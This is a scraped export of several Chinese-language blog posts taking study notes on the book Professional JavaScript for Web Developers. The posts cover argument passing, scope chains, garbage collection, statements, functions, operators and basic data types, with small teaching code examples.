传递参数ES中所有函数的参数都是按值传递的。也就是说，把函数外部的值复制给函数内部的参数，就和把值从一个变量复制到另一个变量一样。基本类型的传递同基本类型变量的复制一样，而引用类型值的传递则同引用类型变量的复制一样。 当向参数传递基本类型的值时，被传递的值会背复制给一个局部变量（即命名参数，其实就是arguments对象的一个元素）。当向参数传递引用类型的值时，会把这个值在内存中的地址复制给一个局部变量，因此，这个局部变量的变化会反映在函数的外部。123456function setName(obj)&#123; obj.name = \"king\";&#125;var person = new Object();setName(person);console.log(person.name); // \"king\" 上例中，在函数调用时，person对象被传递到setName函数中后就背复制给了obj，因为在函数内部obj和person引用的是同一个对象。即使这个对象是俺值传递的，obj也会按引用来访问同一个对象，所以在函数内部obj添加name属性会影响到函数外部的person对象。究其原因是因为person指向的对象在堆内存中只有一个，而且是全局对象。与下例做对比，更能体现函数参数是俺值传递的。12345678function setName(obj)&#123; obj.name = \"king\"; obj = new Object(); obj.name = \"new value\";&#125;var person = new Object();setName(person);console.log(person.name); // \"king\" 这个例子唯一的不同就是在setName多做了两个事儿，重新定义obj对象，同时为这个obj对象定义了一个带有不同值的name属性。在把person传递给setName后，其name属性被设置为king（因为此时obj和person指向同一个内存地址）。然后又将一个新对象赋值给obj，最后将这个其name属性改为new value。 若函数参数是按引用传递，则外部的person.name将会被更新为new value。而事实上却仍然是king，因为obj的引用在被修改为一个本地对象后，原person对象的引用就被obj丢弃了，所以原引用的修改就保持不变。这说明即使函数内部修改了参数的值，原始引用依然不变，实际上，当在函数内部重写obj时，obj变量引用的就是一个局部对象了，这个局部对象在函数执行完毕后就立即被销毁了。 检测类型要检测一个变量的类型是不是属于基本类型可以用typeof操作符，但当被检测变量是引用类型时，typeof仅仅只会返回object，但其实需要的不仅仅是“其是否为对象”，而是想知道其“具体是什么类型”的对象，为此，ES提供了instanceof操作符。 instanceof操作符判断给定引用类型是否为某个构造函数的实例，用法为result = variable instanceof constructor，result是一个布尔值。 执行环境及作用域执行环境（execution context），也被称为“上下文”或“环境”，是js中最为重要的一个概念，执行环境定义了变量或函数有权访问的其他数据，决定了他们各自的行为。每个执行环境都有一个与之关联的变量对象（variable object）,环境中定义的所有变量和函数都保存在这个对象中，程序员编写的代码无法访问这个对象，是供解析器在处理数据时使用的。 全局执行环境是最外围的一个执行环境，根据ES实现所在的宿主环境不同，表示执行环境的对象也不一样，在Web浏览器中，全局执行环境被认为是window对象，因此所有全局变量和函数都作为window对象的属性和方法创建的。某个执行环境中的所有代码执行完毕后，该环境被销毁，保存在其中的所有变量和函数定义也随之销毁（全局执行环境直到应用程序退出，比如：关闭网页或浏览器，时才退出）。 每个函数都有自己的执行环境，当执行流进入一个函数时，函数的环境就会被推入一个环境栈中，而在函数执行之后，栈将其环境弹出，将控制权返回给之前的执行环境，ES中的执行流就是由这种栈机制控制的。 当代码在一个环境中执行时，会创建变量对象的一个作用域链（scope chain），作用域链的用途是保证对执行环境有权访问的所有变量和函数的有序访问。作用域链的前端，始终都是当前执行的代码所在环境的变量对象。若这个环境是函数，则将其活动对象（activation object）作为变量对象，活动对象在最开始时只包含一个变量，即arguments对象（这个对象在全局环境中是不存在的）。作用域链中的下一个变量对象来自包含（外部）环境，而在下一个变量对象来自下一个包含环境，这样一直延续到全局执行环境，全局执行环境的变量对象始终都是作用域链中的最后一个对象。 标识符解析是沿着作用域链一级一级的搜索标识符的过程，搜索过程始终从作用域链的前端开始，然后逐级的向后回溯，直到找到标识符为止，若找不到则可能报错或返回undefined。 1234567var color = 'blue';function changeColor()&#123; if(color === 'blue')&#123; color = 'red'; &#125;&#125;changeColor(); 上例中，函数changeColor的作用域链包含两个对象：它自己的变量对象（其中定义了arguments对象）和全局环境的变量对象。 延长作用域链虽然执行环境的类型只有两种：全局和局部（函数），但有一些语句可以在作用域链的前端临时添加一个变量对象，这些临时变量对象会在代码执行后被移除，即除了函数之外，还有语句能够创建一个独立的作用域。分别是with语句和try-catch的catch块。 对with来说，将指定的对象添加到作用域链中。对catch块来说，则是创建一个新的变量对象，其内包含的是被抛出的错误对象的声明。 没有块级作用域由于js没有块级作用域，所以在条件语句中定义的变量将能被条件语句外访问，包括for循环初始化语句中定义的变量。 声明变量使用var声明的变量将会被自动添加到最接近的环境中，在函数内部，则这个环境就是函数的局部环境。所以这也是为什么不使用var声明变量时，变量会被自动添加到全局环境。 查询标识符由于作用域链，查询标识符（变量名或属性名）时将沿着作用域链依次回溯，直到找到，则立即返回。所以当在局部环境中定义的局部变量覆盖了全局变量后，想要访问全局变量则需要用window.name，或者访问预先保存的父级作用域对象。 垃圾回收js具有自动垃圾回收机制，执行环境负责管理代码执行过程中的内存使用，开发者无需关心内存问题。自动垃圾回收机制的原理很简单：找出不需要继续使用的变量，然后释放其占用的内存。因此，垃圾回收器会按照固定的时间间隔（或代码执行中预定的时间点）周期性的执行操作。 在js中函数局部变量只在函数执行的过程中存在，它的正常生命周期为：函数为局部变量在堆（或栈）内存上分配相应的空间，以便存储它们的值，然后在函数中使用这些变量，直至函数执行结束。此时，局部变量就没有存在的必要了，因此可以释放它们的内存以供将来使用，在这种情况下，很容易判断变量是否需要继续存在，但并非所有情况下都是这么容易判断。垃圾回收器必须跟踪变量的使用，标记不再使用的变量以便将来回收。而标识无用变量的策略因实现而异，通常有两种策略：标记清除和引用计数。 标记清除js中最常用的垃圾回收策略是标记清除（mark-and-sweep）。当变量进入环境（如函数中声明一个变量）时，就将这个变量标记为“进入环境”，从逻辑上讲，永远不能释放进入环境的变量所占用的内存，因为只要执行流进入相应环境，变量就可能会用到。而当变量离开环境后，将其标记为“离开环境”。 可以使用任何方式来标记变量，比如，通过某个特殊的位来记录一个变量合适进入环境或使用“进入环境”/“离开环境”的变量列表来跟踪变量变化，说到底，关键是采取什么策略，而如何标记变量不重要。 垃圾回收器在运行的时候会给存储在内存中的所有变量都加上标记，然后去掉环境中的变量以及被环境中的变量引用的变量的标记。在此之后在加上标记的变量将被视为准备删除的变量，原因是环境中的变量已经无法访问这些变量了。最后垃圾回收器完成内存清理工作，销毁那些带有标记的值并收回其所占的内存。 引用计数另一个不太常见的是引用计数（reference counting），引用计数的含义是跟踪记录每个值被引用的次数。当声明了一个变量并将一个引用类型值赋给该变量时，则这个值的引用次数就是1，若同一个值又被赋给另一个变量，则引用次数加1，当包含这个值引用的变量不再引用这个值时，引用次数减1。当值的引用次数变成0时，则说明没有办法再访问这个值了，因而就可以将其占用内存回收。因此，当下次再执行垃圾回收时，垃圾回收器负责释放引用次数为0的值所占用的内存。 引用计数有一个问题，那就是循环引用，循环引用是指对象A包含一个指向对象B的引用，而对象B又包含一个执行对象A的引用。即通过各自的属性相互引用，这两个值的引用次数至少为2。 采用标记清除的策略中，由于函数执行后这两个对象都离开了作用域，因此不会出现相互引用问题。但在采用引用计数的策略中，即使函数执行完毕，循环引用的变量将继续存在，因为它们的引用次数永不为0，加入这个函数被重复多次调用，就会导致大量内存的占用。 注：IE9之前采用标记清除的策略，但其BOM和DOM中的对象是C++以COM(Component Object Model 组件对象模型)对象的形式而实现的，COM对象的垃圾回收机制是引用计数，因此当在IE中设计COM对象、就有可能存在循环引用的问题。 下例就是一个DOM元素（ele）与一个原生js对象（obj）之间的循环引用问题：1234var ele = document.getElementById('some_element');var obj = new Object();obj.someEle = ele;ele.someObj = obj; 为了避免上述的循环引用问题，最好是不使用它们的时候手动断开原生js对象与DOM元素之间的连接：12obj.someEle = null;ele.someObj = null; 将变量设为null意味着切断变量和它之前引用的值之间的连接，当下次执行垃圾回收时就会被释放掉。 性能问题垃圾回收是周期性执行的，而若为变量分配的内存很大，那么回收时的工作量也非常大。具体来说就是垃圾回收的执行间隔是一个非常重要的问题。 所以最好的方式是动态的调整垃圾回收的时间间隔，主要为调整变量分配、字面量、数组元素的临界值。 注：书中讲的不是很清晰，而且有些古老脱节了 管理内存js在进行内存管理的一个最重要的问题就是：分配给Web浏览器的内存数量通常比给应用程序的少，目的是出于安全考虑，防止js运行的网页耗尽系统的内存而导致系统崩溃。内存的限制不仅影响给变量的内存分配，而且影响调用栈以及线程同时执行的语句的数量。 因此，尽量优化内存占用确保有较好的性能。而占用少内存的最佳方式：仅为执行中的代码保存必要的数据，一旦数据不再使用，通过将其值设置为null来释放其引用，即解除引用（dereferencing），它适用于大部分的全局变量和全局对象的属性，局部变量会在它们离开执行环境时自动被解除引用。123456789function person(name)&#123; var localPerson = new Object(); localPerson.name = name; return localPerson;&#125;var globalPerson = person('king');// ...globalPerson = null; // 解除全局变量的引用 上例中，变量globalPerson取得了person函数返回的值，在person函数中，局部变量localPerson有一个name属性，最后localPerson以函数值的形式返回并赋给全局变量globalPerson。由于localPerson在person函数执行完毕后就离开了其执行环境，因此无需显示为它解除引用，但对全局变量globalPerson，则需要手动解除。 解除引用并不意味垃圾回收器将立即释放该值所占用的内存，而是让值脱离执行环境，以便垃圾回收器下次执行时将其释放。 小结js变量可以用来保存两种类型的值：基本类型值和引用类型值。基本类型的值有5种：Undefined、Null、Boolean、Number、String。总结其特性如下： 基本类型在内存中占据固定大小的空间，因此被保存在栈内存中 从一个变量向另一个变量复制基本类型的值，会创建这个值的一个副本 引用类型的值是对象，保存在堆内存中 包含引用类型值的变量实际包含的不是对象本身，而是指向该值对象的指针 从一个变量向另一个变量复制引用类型的值，复制的其实是指针，因此两个变量最终都指向同一个对象。 确定一个值是那种基本类型可以使用typeof操作符，而确定一个值是那种引用类型可以使用instanceof操作符 所有的变量（包括引用类型和基本类型）都存在于一个执行环境中（作用域/上下文），这个执行环境决定了变量的生命周期，以及那一部分代码可以访问其中的变量。关于执行环境总结特性如下： 执行环境有全局执行环境（全局环境）和函数执行环境之分 每次进入一个新的执行环境，都会创建一个用于搜索变量和函数的作用域链 函数的局部环境不仅有权访问作用域中的变量，而且有权访问其父（祖先）环境，乃至全局环境 全局环境只能访问在全局环境中定义的变量和函数，而不能直接访问年局部环境中的任何数据 变量的执行环境有助于确定应该在合适释放内存 关于js的自动垃圾回收机制总结如下： 离开作用域的值将被自动标记为可以回收，因此将在垃圾回收期间被释放 “标记清除”是主流的垃圾回收算法，这种算法的思想是当前不使用的值加上标记，然后再回收其内存 另一个垃圾回收算法是“引用计数”，思想是跟踪所有值被引用的次数，js引擎一般不是此算法。 当代码中存在循环引用时，引用计数会导致问题 解除变量的引用不仅有主语消除循环引用现象，而且有利于垃圾回收，为了确保有效回收内存，应该及时解除不再使用的全局对象，全局对象属性以及循环引用变量的引用。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"js-pro","slug":"js-pro","permalink":"https://github.com/xmoyKING/tags/js-pro/"}]},{"title":"JavaScript高级程序设计-5-基本概念3-语句/函数","slug":"js-pro5","date":"2016-08-05T07:43:25.000Z","updated":"2017-12-06T14:50:09.352Z","comments":true,"path":"2016/08/05/js-pro5/","link":"","permalink":"https://github.com/xmoyKING/2016/08/05/js-pro5/","excerpt":"","text":"接上文JavaScript高级程序设计-4-基本概念2-数据类型。 语句ES规定的一些语句（流控制语句）与大多数语言相似，例如if、for、while、switch等，但也有一些特殊之处。 for语句对于for语句，需要注意的是，由于ES不存在块级作用域，所以，在循环内部定义的变量在外部可以被访问到：12345678var count = 10;for(var i = 0; i &lt; count; ++i)&#123; var x = 111; console.log(i);&#125;console.log(x); // 111console.log(i); // 10 for-in语句for-in语句是一种精准的迭代语句，可以用来枚举对象的属性：123for(var properName in window)&#123; console.log(properName);&#125; 上述例子将使用for-in循环打印出BOM中window对象的所有属性，每次执行循环时，都将window对象中存在的一个属性名赋值给变量properName, 这个过程会一直持续到对象中的所有属性都被枚举一遍，与for循环类似，这里的var操作符不是必须的，但为了保证局部变量，推荐使用var。 由于ES中对象的属性没有顺序，所以，通过for-in循环输出的属性名的顺序是不可预测的，具体来说，每个属性都会被返回，但返回的先后顺序依浏览器运行时而异。 同时，当查找/迭代一个null或undefined对象的属性时会报错，所以最好先检查该对象是否为null或undefined。 label语句label语句可以在代码中添加标签，以便将来使用,语法为label: statement123start: for(var i = 0; i &lt; 10; ++i)&#123; console.log(i);&#125; 上例的start标签将来可以由break或continue语句引用，加标签的语句一般都要与for语句等循环语句配合使用，例如：1234567891011var num = 0;outermost:for(var i = 0; i &lt; 10; ++i)&#123; for(var j = 0; j &lt; 10; ++j)&#123; if(i == 5 &amp;&amp; j == 5)&#123; break outermost; &#125; num++; &#125;&#125;console.log(num); // 55 上例中，outermost标签表示外面的for语句，若每个循环正常执行10次，则num++语句就会执行100次，即，若两个循环自然结束，则num的值为100。但内部循环中的break语句声明了将要返回的标签，这个标签将导致break语句不仅会退出内部的for语句（即变量j的循环），而且也会退出外部的for语句（变量i的循环）。所以当i和j都等于5时，num的值为55。 在看下面与continue的联用：1234567891011var num = 0;outermost:for(var i = 0; i &lt; 10; ++i)&#123; for(var j = 0; j &lt; 10; ++j)&#123; if(i == 5 &amp;&amp; j == 5)&#123; continue outermost; &#125; num++; &#125;&#125;console.log(num); // 95 在continue的例子中，continue语句会强制继续执行循环，所以即使退出内部循环依然会执行外部循环。当i和j都是5时，continue语句跳出了内部循环，而外部循环直接从i为6开始继续执行，所以，内部循环少计算了5次，最后结果为95。 由于break、continue、label的联用比较复杂，尤其是在嵌套很多循环时将会给调试带来很多麻烦，所以一般不建议使用label，即使要使用，也一定要使用描述性的标签，同时不要嵌套过多循环。 with语句注：不建议使用with语句，大量使用with将导致性能下降，同时调试困难，在严格模式下，不允许使用with语句。with的作用是将代码的作用域设置到一个特定的对象中,而定义with语句的目的主要是为了简化多次编写同一个对象的工作：123456789var qs = location.search.substring(1);var hostName = location.hostname;var url = location.href;// 上面都用到了location对象，则用with可简化为：with(location)&#123; var qs = search.substring(1); var hostName = hostname; var url = href;&#125; 简化后的with语句关联了location对象，即在with语句的代码块中，每个变量首先认为是一个局部变量，若在局部环境找不到该变量的定义，再查询location对象是否存在该属性。 switch语句同其他语言一样，switch语句与if语句关系比较密切，可相互转化。 需要注意的是，switch语句中的case的含义是：若表达式等于这个值，则执行后面的语句。而break关键字会导致代码执行流跳出switch语句。若省略break关键字，则会导致执行玩当前case后，继续执行下一个case。最后的default关键字则用于表达式不匹配前面任何一种情形时执行的备用代码（相当于else语句）。 其次是，switch语句可合并多个case，如下：123456789101112switch(i)&#123; case 1: /* 合并 */ case 2: console.log(\"1 or 2\"); break; case 3: console.log(\"3\"); break; default: console.log(\"default\");&#125; 最后，ES的switch语句有自己的特色：无论是字符串、对象还是其他类型都可以在switch语句中使用，同时case的值可以是变量或表达式、同时switch语句在比较值时使用的是全等，所以不会发生类型转换。1234567891011121314var num = 1;switch(true)&#123; case num &lt; 0: console.log(\"num &lt; 0\"); break; case num &gt;= 0 &amp;&amp; num &lt;= 10: console.log(\"num &gt;= 0 &amp;&amp; num &lt;= 10\"); break; case num &gt; 10 &amp;&amp; num &lt;= 20: console.log(\"num &gt; 10 &amp;&amp; num &lt;= 20\"); break; default: console.log(\"more than 20\");&#125; 函数函数对于任何语言都是非常核心的概念，通过函数可以封装任意多条语句，而且可以复用。ES中的函数基本语法为：123function functioName(arg0, arg1, ..., argN)&#123; statements&#125; ES中的函数在定义时必须指定是否返回值，实际上，若无显示设定返回值则默认返回了undefined。而函数在执行完return语句后停止并立即退出，所以位于return语句之后的任何代码都将不会执行。 同时return语句可以不带任何返回值，在这种情况下函数在停止后将返回undefined，这种用法一般是需要提前停止函数执行而又不需要返回值的情况下。 推荐是要么让函数始终返回一个值，要么始终不返回，否则有时返回有时不返回将不利于代码调试。 理解参数ES函数的参数与大多数语言的函数参数不同，ES不介意传递参数的个数，也不在乎参数的类型。因为ES中的参数在内部是用一个数组来表示的，函数接收到的始终是这个数组，而不关心数组中包含那些参数。命名的参数只提供便利，但不是必须的。 在函数体内通过arguments对象来访问这个参数数组，arguments对象是一个类数组对象（不是数组，但是可用方括号语法访问其元素，使用length来获取参数的个数）。 arguments对象可以与命名参数一起使用，同时arguments的值永远与对应命名参数的值保存同步，即修改arguments将会影响到命名参数。123456789101112function do1(num1, num2)&#123; arguments[1] = 10; console.log(arguments[1], num2);&#125;do1(1, 2); // 10, 10function do2(num1, num2)&#123; num2 = 10; console.log(arguments[1], num2);&#125;do2(1, 2); // 10, 10 // 理论上（JS高级程序设计 3.7.1）：修改命名参数则不会影响到arguments的值， 但实测为相等 关于命名参数，没有传递值的命名参数将自动被赋值为undefined值，与定义了变量但未初始化一样。ES中所有的参数传递都是值，不可能通过引用传递参数。 最后，严格模式下，arguments对象的使用有限制：重写arguments值的代码将不会执行123456789101112\"use strict\";function do1(num1, num2)&#123; arguments[1] = 10; console.log(arguments[1], num2);&#125;do1(1, 2); // 10, 2function do2(num1, num2)&#123; num2 = 10; console.log(arguments[1], num2);&#125;do2(1, 2); // 2, 10 没有重载ES函数不能如C/C++那样实现重载，由于ES函数没有签名（签名指的是：函数接受的参数的类型和数量）的概念，所以通过函数签名来实现重载就不可能了。ES中函数重名的结果就是后定义的会覆盖以前的同名函数。 但通过检查传入函数中的参数的类型和数量，可以模仿方法的重载。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"js-pro","slug":"js-pro","permalink":"https://github.com/xmoyKING/tags/js-pro/"}]},{"title":"JavaScript高级程序设计-4-基本概念2-操作符","slug":"js-pro4","date":"2016-08-05T00:17:46.000Z","updated":"2017-12-06T14:50:09.352Z","comments":true,"path":"2016/08/05/js-pro4/","link":"","permalink":"https://github.com/xmoyKING/2016/08/05/js-pro4/","excerpt":"","text":"接上文JavaScript高级程序设计-3-基本概念1-数据类型。 操作符ECMA-262定义了一组用于操作数据值的操作符，包括算术操作符（加号/减号）、位操作符、关系操作符和相等操作符。ES中的操作符的特殊之处在于，它们能适用于不同的值，如字符串、数字值、布尔值、甚至对象，不过当操作数是对象时，相应的操作符通常需要调用对象的valueOf或toString方法，以便取得可以操作的值。 一元操作符只能操作一个值的操作符叫一元操作符 递增/减操作符递增/减操作符借鉴于C语言，而且也有两个版本，前置型和后置型，两者区别是：执行前置操作时，变量的值都是在语句被求值以前改变的，即先执行一元操作符，在执行其他计算操作。而后置操作则相反。1234567891011// 前置var num1 = 2;var num2 = 20;var num3 = --num1 + num2; // 21var num4 = num1 + num2; // 21// 后置var num1 = 2;var num2 = 20;var num3 = num1-- + num2; // 22var num4 = num1 + num2; // 21 它们不仅可以用于整数，还可以用于字符串、布尔值、浮点数和对象，规则如下： 当用于一个包含有效数字字符的字符串时，现将其转换为数字值，在执行自增/减1操作，字符串变量变为数值变量 当用于一个不包含有效数字字符的字符串时，将变量的值设置为NaN，字符串变量变为数值变量 当用于布尔值false时，先将其转换为0，然后执行自增/减1操作，布尔值变量变为数值变量 当用于布尔值true时，先将其转换为1，然后执行自增/减1操作，布尔值变量变为数值变量 当用于浮点数值时，执行自增/减1操作 当用于对象时，先调用对象的valueOf方法以取得一个可供操作的值，然后对该值应用上述规则，若结果为NaN，则调用对象的toString方法，然后再应用上述规则，对象变量变为数值变量。1234567891011121314var s1 = \"2\", s2 = \"z\", b = false, f = 1.1, o = &#123; valueOf: function()&#123; return -1; &#125; &#125;;s1++; // 3s2++; // NaNb++; // 1f--; // 0.100000000000001 浮点数有舍入误差o--; // -2 一元加/减操作符这两个ES操作符的作业与数学上的完全一致，一元加（+）放在数值前不会产生任何影响：12var num = 22;num = +num; // 22 但，若对非数值应用一元加操作符时，则该操作符会像Number()转型函数一样对这个值执行转换，即，布尔值false和true将被转换为0和1，字符串会按照字符串规则进行解析，而对象先调用valueOf或toString，再转换其值。12345678910111213141516var s1 = \"01\", s2 = \"1.1\", s3 = \"z\", b = false, f = 1.1, o = &#123; valueOf: function()&#123; return -1; &#125; &#125;;s1 = +s1; // 1s2 = +s2; // 1.1s3 = +s3; // NaNb = +b; // 0f = +f; // 1.1o = +o; // -1 一元减则是将数值转换为负数，当应用于数值时，直接返回负数，若应用于非数值时，则先按照一元加的规则将其转换为数值，然后再转换为负数。 位操作符位操作符用于一个最基本的层次上，即按内存中表示数值的位来操作数值。ES中所有数值都以64位IEEE75格式存储，但位操作符不能直接操作64位的值，而是将64位的值转换为32位的整数，然后执行操作，最后再将结果转换回64位。对于开发者而言，整个过程是透明的，就像只存在32位的整数一样。 对于有符号的整数，32位中的前31位用于表示整数的值，第32位用于表示数值的符号，叫做符号位，0表示正，1表示负，符号位的值决定了其他位数值的格式。 正数以纯二进制格式存储，31位中的每一位都表示2的幂，没有用到的位以0填充，计算时忽略，比如：0000010010简化为10010，表示数值18. 负数以二进制补码格式存储，求补码的步骤为：先求绝对值的二进制码，然后求其反码，最后加1即可。 而ES将上述的很多细节隐藏了，比如输出一个负数的二进制字符串时仅仅是在这个数的绝对值的二进制前加一个负号：12var num = -18;num.toString(2); // \"-10010\" 注：默认情况下，ES中所有的整数都是有符号整数，不过，也有无符号整数，即第32位不表示符号，而无符号整数只能表示正数。同时，由于ES将64位转换为32位再计算位操作，所以对NaN和Infinity两个值应用位操作时，这两个值将被当做0处理。对非数值应用位操作符，会先使用Number()将值转换为一个数值，然后再应用位操作，得到的结果将是一个数值。 1.按位非（NOT）按位非操作符用波浪线（~）表示，按位非的结果就是返回数值的反码。12var num = 25; // 二进制 0..011001var num2 = ~num1; // -26, 二进制 1..1100110 对25执行按位非操作，结果得到-26，按位非的本质：操作数的负值减1。同时由于是最底层支持操作，因此速度很快。 2.按位与（AND）按位与操作符用and字符（&amp;）表示，需要两个操作数，将两个操作数的每一位对齐，然后只有对应位都是1时返回1，否则返回0。1234var result = 25 &amp; 3; // 1// 25 = 0..0 0001 1001// 3 = 0..0 0000 0011//AND = 0..0 0000 0001 上例中，25和3的二进制对应只有1位同时为1，其他位都是0，所以最终结果为1 3.按位或（OR）按位或操作符用竖线符号（|）表示，需要两个操作数，将两个操作数的每一位对齐，然后只有对应位都是0时返回0，否则返回1。1234var result = 25 | 3; // 27// 25 = 0..0 0001 1001// 3 = 0..0 0000 0011// OR = 0..0 0001 1011 4.按位异或（XOR）按位异或操作符由一个插入符号（^）表示，需要两个操作数，将两个操作数的每一位对齐，然后只有对应位不同时返回1，否则返回0。1234var result = 25 ^ 3; // 26// 25 = 0..0 0001 1001// 3 = 0..0 0000 0011//XOR = 0..0 0001 1010 5.左移左移操作符由两个小于号（&lt;&lt;）表示，将操作数的所有位向左移动指定位数，以0填充右侧的空位。12var oldVal = 2; // 二进制 10var newVal = oldVal &lt;&lt; 5; // 二进制 1000000 ，十进制64 左移不会影响操作数的符号位，即，若将-2左移5位，则结果是-64，而不是64。 6.有符号右移有符号右移操作符由两个大于号（&gt;&gt;）表示，将操作数的所有位向右移动指定位数，但保留符号位，即与左移相反, 以符号位填充左侧的空位。12var oldVal = 64; // 二进制 1000000var newVal = oldVal &gt;&gt; 5; // 二进制 10 ，十进制2 7.无符号右移无符号右移操作符由三个大于号（&gt;&gt;&gt;）表示，以0填充左侧的空位，所以对正数来说，结果与有符号右移相同，但对负数来说，因为负数使用绝对值的二进制补码格式存储的，而结果就是解释为正数的时变得非常大。12var oldVal = -64; // 二进制 1..11000000var newVal = oldVal &gt;&gt;&gt; 5; // 等于十进制134217726 布尔操作符布尔操作符有三个：逻辑非（NOT）、逻辑与（AND）、逻辑或（OR）。 逻辑非（NOT）操作符由叹号(!)表示, 将一个值转换为与其对应的布尔值，然后求反。但连续使用两个非操作符结果与Boolean()转型函数相同。 逻辑与（AND）操作符由两个&amp;号(&amp;&amp;)表示，逻辑或（OR）由两个|号(||)表示，都有短路运算的效果。 乘性操作符乘性操作符有三个:乘，除，求模。与C语言类型，只不过，当操作数为非数值时将会自动执行类型转换，即先用Number()转型函数将其转换为数值，例如：空字符串转为0，true转为1，然后再计算。 加性操作符加性操作符有2个：加和减。 对加来说，其实规则比较复杂，而且比较容易出错，总结下来： 当两个操作数都是数值时，则结果为常规结果。 若有一个操作数是字符串，则会被当做字符串的链接操作，另一个操作数将先转化为字符串，再连接 若有一个数值，结果是先将另一个操作数（非字符串非数值的变量）转换为数值，然后再计算。 对减也与加类似，但是原则是将非数值尽量转换为数值，然后进行计算。 关系操作符关系操作符有: &lt;, &gt;, &lt;=, &gt;=，是比较两个值的大小。结果是一个布尔值，规则如下： 当操作数都为数值时，直接比较 当操作数都是字符串时，比较字符串对应的字符编码（ASCII码） 当一个是数值时，则将另一个转换为数值，再进行比较 当一个是布尔值时，将布尔值转换为数值，再进行比较 当操作数为对象时，则调用操作数的valueOf方法，若没有则调用toString方法，调用方法的结果再按上述规则比较。 相等操作符确定两个变量是否相等子是一个非常重要的操作，在比较字符串、数值、布尔值时比较简单，但涉及对象时就比较复杂了，ES提供了两组操作符：相等/不相等（先转换再比较），全等/不全等（不转换直接比较）。 ES中的相等由==表示，不相等由!=表示，当数据类型不同时，先转换操作数，再进行比较，规则如下： 若一个操作数是布尔值，则先将其转换为数值 若一个操作数是字符串，另一个是数值，则先将字符串转换为数值 若一个是对象，另一个不是，则调用对象的valueOf方法，得到基本类型后再按照前面的规则比较需要注意的是： null和undefined是相等的，在比较相等性之前，不能将null和undefined转换为其他任何值 若有一个操作数是NaN，则相等操作符直接返回false，而不相等操作符返回true。 若两个操作数都是对象，则比较其是否是同一个对象，若是则返回true，否则返回false。（不进行深度比较） 推荐优先使用全等/不全等（不转换直接比较）。 条件操作符条件操作符即三元操作符（? :）,与其他语言的规则无区别，先求取表达式的结果，再决定执行哪一个表达式。 赋值操作符赋值操作符为=，与其他语言的规则无区别，需要注意的就是复合赋值操作符（*=,+=,-=等）的目的是简化赋值操作，并不会带来任何性能提升。 逗号操作符逗号操作符用于在一条语句中执行多个操作，多用声明多个变量。需要注意的是，当赋值时，逗号操作符总会返回表达式的最后一项。1var num = (4,5,6,.1,0); // 0","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"js-pro","slug":"js-pro","permalink":"https://github.com/xmoyKING/tags/js-pro/"}]},{"title":"JavaScript高级程序设计-3-基本概念1-数据类型","slug":"js-pro3","date":"2016-08-04T05:48:51.000Z","updated":"2017-12-06T14:50:09.352Z","comments":true,"path":"2016/08/04/js-pro3/","link":"","permalink":"https://github.com/xmoyKING/2016/08/04/js-pro3/","excerpt":"","text":"记录js语言的基本概念的笔记、包括语法和流控制语句，分析js与其他基于C的语言在语法上的相同和不同之处，与内置操作符有关的类型转换问题。 语法ES的语法大量借鉴了C及其他类C语言的语法，因此，熟悉语法的开发人员在接受ES更宽松的语法时会觉得很简单轻松。 区分大小写，ES的一切（包括变量名、函数名、操作符）都是区分大小写的 标识符，惯例按照小驼峰格式，如myCar,firstList,不能将保留字，关键字，true/false/null作为标识符 严格模式，ES5中引入的严格模式（strict mode）定义了不同于ES3的解析和执行模型。该模式纠正了一些ES3中不确定的行为，对某些不安全的操作会抛出错误。在脚本中添加&quot;use strict&quot;;之后的代码将执行严格模式，这行代码看起来像字符串，而且没有赋值给任何变量，其实是一个编译指示（pragma），告诉js引擎切换到严格模式，这是为了不破坏ES3语法而特定选定的语法。 语句，ES中的语句以分号结尾，若省略分号，则由解析器确定语句的结尾。不省略分号能够避免很多错误（如不完整的输入），同时利于压缩，在某些情况下能增加代码的性能，因为解析器不必再花时间推测应该在哪里插入分号。代码块以花括号{}为界，虽然在条件控制语句（如if、for等）下只执行一行代码时能省略花括号，但最佳实践是始终写花括号，因为让代码更清晰，降低修改代码出错的几率 关键字和保留字JS关键字和保留字 变量ES的变量是松散类型的，即可以用来保存任何类型的数据，将每个变量看作是一个用于保存值的占位符即可。定义变量时使用var操作符(var是一个关键字)，后面跟一个变量名（即标识符）。 使用var操作符定义的变量将成为定义该变量的作用域中的局部变量，也就是说，当在函数中使用var定义了一个变量，那么这个变量将在函数退出后被销毁，而未经初始化的变量会保存一个特殊的值undefined。 若省略var操作符则会定一个全局变量，但不推荐这样定义全局变量，在严格模式下，省略var操作符会报错，给一个未经声明的变量赋值在严格模式下会导致ReferenceError的错误，同时非常不利于维护，也容易导致一些混乱。 严格模式下，不能定义名为eval和arguments的变量（虽然他们俩并不是保留字或关键字）。 可以在一条语句内定义多个变量, 用逗号分开，初始化是可选的：123var msg = 'hi', find = false, age = 11; 数据类型ES定义了5中简单数据类型（基本数据类型）：Undefined,Null,Boolean,Nu,mber,String。以及一种复杂类型Object,其本质是无序的键值对集。ES不支持创建自定义类型，所有的值最终都是上述6种数据类型之一。但由于ES数据类型具有动态性，因此没有定义其他类型的必要。 typeof操作符鉴于ES变量是松散类型，因此需要有一种手段来检测给定变量的数据类型，typeof就是干这个的，对一个值使用typeof操作符可能返回如下的字符串： &quot;undefined&quot; 若这个值未定义 &quot;boolean&quot; 若这个值是布尔值 &quot;string&quot; 若这个值是字符串 &quot;number&quot; 若这个值是数字 &quot;object&quot; 若这个值是对象或null &quot;function&quot; 若这个值是函数typeof是一个操作符，不是函数，虽然可以用括号将其后跟的操作数包裹起来，操作数可以是变量，也可以是数值字面量。 从技术角度来说，ES中的函数是一个对象，而不是一种数据类型，这个对象有一些特殊的属性，因此通过typeof操作符区分函数和其他对象是有必要的。 注:因为特殊值null被认为是一个空对象引用，所以typeof null返回&quot;object&quot;。 Undefined类型Undefined类型只有一个值，即undefined。在使用var声明变量但未对其加以初始化时这个变量的值就是undefined。 一般而言不需要显示将一个变量设置为undefined，字面量值undefined主要目的是用于比较。 但是包含undefined值的变量与未定义的变量还是不一样：1234var msg; // 这个变量声明后默认为undefined值alert(msg); // \"undefined\"alert(age); // 没有声明，产生错误 